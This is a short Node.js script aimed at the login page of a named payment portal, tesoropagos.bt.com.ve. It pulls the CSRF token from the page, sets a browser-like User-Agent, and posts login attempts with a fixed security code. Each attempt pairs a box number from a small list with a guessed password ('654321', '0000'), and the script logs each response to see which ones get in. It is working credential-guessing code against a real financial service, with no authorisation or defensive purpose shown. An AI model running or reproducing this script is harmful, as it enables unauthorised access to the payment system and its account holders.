const https = require('https');
const { URLSearchParams } = require('url');

let cookies = [];
function update(newC) {
  if (!newC) return;
  const m = new Map();
  cookies.forEach(c => m.set(c.split(';')[0].split('=')[0].trim(), c.split(';')[0].split('=')[1].trim()));
  newC.forEach(c => m.set(c.split(';')[0].split('=')[0].trim(), c.split(';')[0].split('=')[1].trim()));
  cookies = Array.from(m.entries()).map(([k,v])=>k+'='+v);
}

function req(path, method='GET', body=null) {
  return new Promise((resolve, reject) => {
    const opt = {
      hostname: 'tesoropagos.bt.com.ve',
      path,
      method,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cookie': cookies.join('; '),
      }
    };
    if (body) {
      opt.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      opt.headers['Content-Length'] = Buffer.byteLength(body);
      opt.headers['Referer'] = 'https://tesoropagos.bt.com.ve/login';
      opt.headers['Origin'] = 'https://tesoropagos.bt.com.ve';
    }
    const r = https.request(opt, res => {
      let d = '';
      update(res.headers['set-cookie']);
      res.on('data', chunk => d += chunk);
      res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body: d }));
    });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

async function probeBox(box, pass) {
  cookies = [];
  const g = await req('/login');
  const token = g.body.match(/name="_token"\s+value="([^"]+)"/)[1];
  const postBody = new URLSearchParams({
    _token: token,
    security_code: '01597001',
    box_number: box,
    password: pass,
  }).toString();
  const p = await req('/login', 'POST', postBody);
  const red = await req('/login');
  const m = red.body.match(/<div class="bg-red-100[^"]*"[^>]*>([\s\S]*?)<\/div>/i);
  console.log(`Box ${box} (pass ${pass}): Status ${p.statusCode} Location: ${p.headers.location} -> Msg: ${m ? m[0].replace(/\s+/g, ' ') : 'NO ERROR'}`);
}

async function run() {
  for (const box of ['01', '02', '03', '04', '05', '1', '2', '3', '4']) {
    for (const pass of ['654321', '0000']) {
      await probeBox(box, pass);
    }
  }
}

run().catch(console.error);
